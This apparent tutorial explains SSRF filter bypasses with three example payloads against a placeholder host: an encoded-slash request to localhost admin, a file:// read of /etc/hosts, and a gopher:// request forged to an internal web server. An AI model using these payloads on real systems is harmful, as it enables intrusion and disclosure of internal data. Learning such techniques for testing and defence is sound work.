Crafting SSRF Payloads

Bypassing Filters with URL Schemes and Encoding

URL Encoding

URL encoding can bypass basic input filters that look for specific characters or patterns. Encoding parts of the URL can obscure the true intent.

http://target.com/check_url?url=http://127.0.0.1%2fadmin

%2f is the URL-encoded slash.

file:// Scheme

Allows the server to read local files from its filesystem. This is a direct path to information disclosure.

http://target.com/check_url?url=file:///etc/hosts

Reading the local hosts file.

gopher:// Scheme

A powerful scheme for sending arbitrary data over TCP, enabling interaction with various internal services or even RCE.

http://target.com/check_url?url=gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0AHost:%20127.0.0.1%0A%0A

Crafting a GET request to an internal web server.

Key Takeaway

Effective SSRF exploitation requires understanding how to manipulate URLs through encoding and by leveraging various URL schemes to bypass filters and access restricted internal resources.
